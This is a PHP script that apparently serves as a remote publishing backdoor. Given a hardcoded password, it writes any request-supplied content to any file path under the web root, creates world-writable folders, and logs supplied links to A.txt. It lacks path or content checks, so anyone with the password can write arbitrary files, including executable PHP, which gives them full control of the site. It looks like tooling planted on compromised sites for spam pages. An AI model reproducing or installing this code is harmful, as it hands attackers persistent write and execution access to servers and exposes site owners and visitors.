<?php
//header("Content-Type: text/html; charset=utf-8");
$sys_password="abcdefgh";
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$uploadpath=$_REQUEST['uploadpath'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);
$ahref=stripslashes($_REQUEST['ahref']);

if($action=="test")
{
    echo 'test success';
    return;
}

if($action!="publish")
{
    echo 'action error';
    return;
}

if($action==""||$password==""||$filename==""||$body=="")
{
    echo 'parameters error';
    return;
}

if($password!=$sys_password)
{
    echo 'password error';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$articlePath=$rootPath;
$aPath="";

if($uploadpath!="")
{
    createFolder($rootPath.'/'.$uploadpath);
    $articlePath=$rootPath.'/'.$uploadpath.'/'.$filename;
    $aPath=$rootPath.'/'.$uploadpath.'/A.txt';
}
else
{
    $articlePath=$filename;
    $aPath='A.txt';
}


$fp=fopen($articlePath,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,$body);
fclose($fp);

$fp=fopen($aPath,"a+");
fwrite($fp,$ahref."\r\n");
fclose($fp);

if(file_exists($articlePath))
{
    echo "publish success";
}

function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
 
function mkdirs($dir)  
{ 
    if(!is_dir($dir))  
    {  
        if(!mkdirs(dirname($dir)))
        {  return false;  }  
        if(!mkdir($dir,0777))
        {  return false;  }
    } 
    return true;  
}  

function rmdirs($dir)  
{  
    $d = dir($dir); 
    while (false !== ($child = $d->read()))
    {  
        if($child != '.' && $child != '..')
        {  
            if(is_dir($dir.'/'.$child))  
                rmdirs($dir.'/'.$child);  
            else 
                unlink($dir.'/'.$child); 
        }
    }  
    $d->close();  
    rmdir($dir);  
}
?>